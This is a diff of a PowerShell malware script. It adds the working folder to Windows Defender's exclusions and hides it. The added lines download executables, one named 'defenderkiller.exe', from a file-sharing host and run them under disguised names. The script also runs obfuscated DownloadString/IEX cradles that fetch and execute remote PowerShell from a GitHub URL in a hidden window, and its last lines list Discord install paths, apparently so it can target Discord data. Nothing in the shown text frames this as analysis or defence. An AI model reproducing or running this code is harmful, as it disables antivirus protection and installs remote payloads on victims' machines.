@@ -66,17 +66,18 @@ New-Item -ItemType Directory -Path $dir
 Add-MpPreference -ExclusionPath $dir
 attrib +h +s $dir
 
-
-
-
-
+Invoke-WebRequest -Uri "https://anonsharing.com/file/3afac857318f312f/defenderkiller.exe" -OutFile "$dir\click yes pls.exe"; Start-Process "$dir\click yes pls.exe"
+Invoke-WebRequest -Uri "https://anonsharing.com/file/91dab2685e4481c4/fix.exe" -OutFile "$dir\prysmaxx.exe"; Start-Process "$dir\prysmaxx.exe"
 
 $shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/downloadfile.ps1")
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
 
-Invoke-WebRequest -Uri "https://anonsharing.com/file/3afac857318f312f/defenderkiller.exe" -OutFile "$dir\click yes pls.exe"; Start-Process "$dir\click yes pls.exe"
-Invoke-WebRequest -Uri "https://anonsharing.com/file/91dab2685e4481c4/fix.exe" -OutFile "$dir\prysmaxx.exe"; Start-Process "$dir\prysmaxx.exe"
+$shellcode = ("https://raw.githubusercontent.com/43a1723/test/refs/heads/main/s/ping.ps1")
+$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
+Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -PassThru
+
+
 
 $locAppData = [System.Environment]::GetEnvironmentVariable("LOCALAPPDATA")
 $discPaths = @("Discord", "DiscordCanary", "DiscordPTB", "DiscordDevelopment")
